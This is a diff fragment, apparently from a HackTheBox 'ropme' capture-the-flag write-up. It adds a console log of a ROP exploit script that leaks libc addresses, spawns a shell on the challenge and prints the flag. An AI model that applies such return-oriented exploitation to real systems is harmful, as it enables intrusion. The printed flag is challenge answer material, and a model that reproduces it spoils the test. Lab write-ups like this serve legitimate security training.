@@ -73,3 +73,21 @@ f.write(buf + chr(0x0a))
  
 interact(s)
 ```
+
+
+```console
+root@kali:/mnt/hgfs/HackTheBox/Challenges/ropme# python htb_ropeme.py 
+- libc_puts: 0x7fd13105f690
+- libc base: 0x7fd130ff0000
+- libc_system: 0x7fd131035390
+- /bin/sh: 0x7fd13117cd57
+- libc_fflush: 0x7fd13105d7a0
+
+ROP me outside, how 'about dah?
+ls
+flag.txt
+ropme
+spawn.sh
+cat flag.txt
+HTB{r0p_m3_if_y0u_c4n!}
+```
